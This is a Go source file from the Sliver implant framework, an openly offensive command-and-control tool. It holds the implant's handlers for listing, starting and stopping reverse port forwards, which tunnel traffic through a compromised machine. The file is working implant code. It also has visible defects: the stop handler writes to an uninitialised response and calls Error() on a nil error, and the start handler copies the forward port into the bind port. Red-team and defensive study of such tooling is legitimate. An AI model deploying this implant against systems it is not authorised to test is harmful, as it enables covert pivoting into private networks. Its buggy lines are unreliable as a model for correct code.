package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	"time"

	// {{end}}

	rportfwd "github.com/bishopfox/sliver/implant/sliver/rportfwd"
	"github.com/bishopfox/sliver/implant/sliver/tcpproxy"
	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

var (
	genericRportFwdHandlers = map[uint32]RportFwdHandler{
		pb.MsgRportFwdListeners:        rportFwdListenersHandler,
		pb.MsgRportFwdStartListenerReq: rportFwdStartListenerHandler,
		pb.MsgRportFwdStopListenerReq:  rportFwdStopListenerHandler,
		//pb.MsgPivotPeerEnvelope:     pivotPeerEnvelopeHandler,
	}
)

// GetPivotHandlers - Returns a map of pivot handlers
func GetRportFwdHandlers() map[uint32]RportFwdHandler {
	return genericRportFwdHandlers
}

func rportFwdListenersHandler(envelope *pb.Envelope, connection *transports.Connection) {

	forwards := rportfwd.Portfwds.List()
	var portfwdListeners []*pb.RportFwdListener

	for _, portfwd := range forwards {

		portfwdListeners = append(portfwdListeners, &pb.RportFwdListener{
			ID:             uint32(portfwd.ID),
			BindAddress:    portfwd.BindAddr,
			ForwardAddress: portfwd.RemoteAddr,
		})
	}
	data, _ := proto.Marshal(&pb.RportFwdListeners{
		Listeners: portfwdListeners,
		Response:  &commonpb.Response{},
	})
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: data,
	}

}
func rportFwdStartListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.RportFwdStartListenerReq{}
	resp := &pb.RportFwdListener{Response: &commonpb.Response{}}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		resp.Response.Err = err.Error()
		data, _ := proto.Marshal(resp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
		return
	}

	tcpProxy := &tcpproxy.Proxy{}
	channelProxy := &rportfwd.ChannelProxy{
		Conn:            connection,
		RemoteAddr:      req.ForwardAddress,
		BindAddr:        req.BindAddress,
		KeepAlivePeriod: 60 * time.Second,
		DialTimeout:     30 * time.Second,
	}
	tcpProxy.AddRoute(req.BindAddress, channelProxy)
	rportfwd := rportfwd.Portfwds.Add(tcpProxy, channelProxy)

	go func() {
		err := tcpProxy.Run()
		if err != nil {
			log.Printf("Proxy error %s", err)
		}
	}()
	resp.BindAddress = req.BindAddress
	resp.ForwardAddress = req.ForwardAddress
	resp.BindPort = req.ForwardPort
	resp.ForwardPort = req.ForwardPort
	resp.ID = uint32(rportfwd.ID)

	data, _ := proto.Marshal(resp)
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: data,
	}
	return
	//con.PrintInfof("Port forwarding %s -> %s:%s\n", bindAddr, remoteHost, remotePort)
}

func rportFwdStopListenerHandler(envelope *pb.Envelope, connection *transports.Connection) {
	req := &pb.RportFwdStopListenerReq{}
	resp := &pb.RportFwdListener{}
	err := proto.Unmarshal(envelope.Data, req)
	if err != nil {
		resp.Response.Err = err.Error()
		data, _ := proto.Marshal(resp)
		connection.Send <- &pb.Envelope{
			ID:   envelope.ID,
			Data: data,
		}
		return
	}

	res := rportfwd.Portfwds.Remove(int(req.ID))
	if res == true {
		resp.ID = req.ID
	} else {
		resp.Response.Err = err.Error()
	}

	data, _ := proto.Marshal(resp)
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: data,
	}
	return
}
